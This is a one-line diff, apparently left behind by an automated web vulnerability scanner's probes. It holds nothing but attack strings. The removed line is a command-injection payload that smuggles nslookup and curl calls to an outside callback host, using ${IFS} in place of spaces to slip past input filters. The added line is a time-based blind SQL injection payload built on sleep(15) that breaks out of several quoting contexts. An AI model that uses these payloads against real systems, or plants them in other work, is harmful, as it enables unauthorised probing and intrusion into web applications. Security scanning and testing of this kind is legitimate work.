@@ -1,1 +1,1 @@
-|(nslookup${IFS}-q${IFS}cname${IFS}hiticxpturwvhe10c0.bxss.me||curl${IFS}hiticxpturwvhe10c0.bxss.me)
+(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
